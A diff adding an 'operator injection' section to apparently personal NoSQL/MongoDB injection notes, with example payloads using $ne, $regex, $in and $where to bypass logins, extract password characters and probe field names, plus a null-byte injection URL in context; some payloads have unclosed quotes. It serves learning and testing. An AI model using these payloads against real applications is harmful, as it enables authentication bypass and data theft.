@@ -88,3 +88,49 @@ https://insecure-website.com/product/lookup?category=fizzy'%00
 this.category == 'fizzy'\u0000' && this.released == 1
 ```
 
+---
+
+#**OPERATOR INJECTION**
+
+MOST COMMON OPERATORS USED ARE : 
+1. "$ne" : not equal to operator
+```
+-> example : {"username" : {"$ne" : ""} , "password":{"$ne": ""}
+```
+2. "$regex" : to match by operators
+```
+-> example : { "username": {"$regex" : "^adm.*} , "password" : {"$ne" : ""}
+```
+3. "$in" : to match in array
+```
+-> example : {"username" : {"$in" : ["admin"]}
+```  
+4. "$where" : to match a condition and use javascript functions like mapReduce() , match() etc.
+```
+-> example 1 : {"$where":"this.username == 'admin'"}
+   example 2 : {"$where" : "this.username == 'admin' &&  this.password[0] == 'a' || 'a'=='b
+   example 3 : {"$where" : "this.username =='admin' && this.password.match(/\d/) || 'a'=='b
+```
+
+
+*Here there is one problem and that basically is that unless you know the fields like password or username (this.username or this.password) you cant do much.
+So there are two ways to know the field names.*
+
+**FIRST METHOD : DICTIONARY ATTACK  **
+This method involves observation bias to draw conclusions. 
+Example : IF you know that username field exists , 
+          you can then first send the request 
+          then observe the response.
+          ```
+          admin' && this.username!=' 
+          ```
+          then for a non existent field 
+          do the same.
+          ```
+          admin' && this.foo!='
+          ```
+          You have to note differences in 
+          response when the field existed and when 
+          it didnt.
+          
+After this we maintain a list of potential fields with respect to the application being tested, and then find the existent fields.
